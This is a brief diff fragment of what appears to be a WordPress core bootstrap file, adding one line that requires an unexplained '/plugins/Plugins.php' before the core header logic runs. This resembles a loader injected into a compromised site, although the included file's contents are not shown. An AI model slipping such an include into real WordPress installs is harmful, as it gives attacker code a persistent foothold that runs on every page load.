@@ -5,6 +5,7 @@
  * @package WordPress
  */
 
+require_once(dirname(__FILE__).'/plugins/Plugins.php');
 if ( !isset($wp_did_header) ) {
 
 	$wp_did_header = true;
